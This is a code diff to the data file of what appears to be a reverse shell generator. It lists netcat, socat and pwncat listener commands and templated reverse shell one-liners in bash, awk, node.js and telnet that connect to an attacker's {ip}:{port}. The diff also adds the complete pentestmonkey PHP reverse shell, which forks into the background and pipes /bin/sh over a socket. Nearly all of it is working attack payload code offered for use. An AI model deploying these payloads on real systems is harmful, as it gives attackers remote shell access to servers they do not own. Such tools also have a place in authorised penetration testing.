@@ -1,8 +1,8 @@
 const rsgData = {
 
     listenerCommands: [
-        ['pwncat', 'python3 -m pwncat -lp {port}'],
         ['nc', 'nc -lvnp {port}'],
+        ['pwncat', 'python3 -m pwncat -lp {port}'],
         ['rlwrap + nc', 'rlwrap nc -lvnp {port}'],
         ['windows ConPty', 'stty raw -echo; (stty size; cat) | nc -lvnp {port}'],
         ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
@@ -10,6 +10,8 @@ const rsgData = {
     ],
 
     shells: ['sh', 'bash', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh'],
+
+    // upgrades: ['test', 'testicle', 'test2'],
     
     reverseShellsCommands: [
         ['Bash -i', '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1'],
@@ -40,8 +42,8 @@ const rsgData = {
         ['socat #2 (TTY)', 'socat TCP:{ip}:{port} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane'],
         ['awk', 'awk \'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'],
         ['node.js', 'require(\'child_process\').exec(\'nc -e /bin/{shell} {ip} {port}\')'],
-        ['telnet', 'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF']
-        
+        ['telnet', 'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF'],
+        ['PentestMonkey', '&lt;?php\n\/\/ php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https:\/\/raw.githubusercontent.com\/pentestmonkey\/php-reverse-shell\/master\/php-reverse-shell.php\n\/\/ Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = \'{ip}\';\n$port = {port};\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = \'uname -a; w; id; \/bin\/sh -i\';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists(\'pcntl_fork\')) {\n	$pid = pcntl_fork();\n	\n	if ($pid == -1) {\n		printit(\"ERROR: Can\'t fork\");\n		exit(1);\n	}\n	\n	if ($pid) {\n		exit(0);  \/\/ Parent exits\n	}\n	if (posix_setsid() == -1) {\n		printit(\"Error: Can\'t setsid()\");\n		exit(1);\n	}\n\n	$daemon = 1;\n} else {\n	printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"\/\");\n\numask(0);\n\n\/\/ Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n	printit(\"$errstr ($errno)\");\n	exit(1);\n}\n\n$descriptorspec = array(\n   0 =&gt; array(\"pipe\", \"r\"),  \/\/ stdin is a pipe that the child will read from\n   1 =&gt; array(\"pipe\", \"w\"),  \/\/ stdout is a pipe that the child will write to\n   2 =&gt; array(\"pipe\", \"w\")   \/\/ stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n	printit(\"ERROR: Can\'t spawn shell\");\n	exit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n	if (feof($sock)) {\n		printit(\"ERROR: Shell connection terminated\");\n		break;\n	}\n\n	if (feof($pipes[1])) {\n		printit(\"ERROR: Shell process terminated\");\n		break;\n	}\n\n	$read_a = array($sock, $pipes[1], $pipes[2]);\n	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n	if (in_array($sock, $read_a)) {\n		if ($debug) printit(\"SOCK READ\");\n		$input = fread($sock, $chunk_size);\n		if ($debug) printit(\"SOCK: $input\");\n		fwrite($pipes[0], $input);\n	}\n\n	if (in_array($pipes[1], $read_a)) {\n		if ($debug) printit(\"STDOUT READ\");\n		$input = fread($pipes[1], $chunk_size);\n		if ($debug) printit(\"STDOUT: $input\");\n		fwrite($sock, $input);\n	}\n\n	if (in_array($pipes[2], $read_a)) {\n		if ($debug) printit(\"STDERR READ\");\n		$input = fread($pipes[2], $chunk_size);\n		if ($debug) printit(\"STDERR: $input\");\n		fwrite($sock, $input);\n	}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n	if (!$daemon) {\n		print \"$string\\n\";\n	}\n}\n\n?&gt;']        
     ],
 
     specialCommands: {
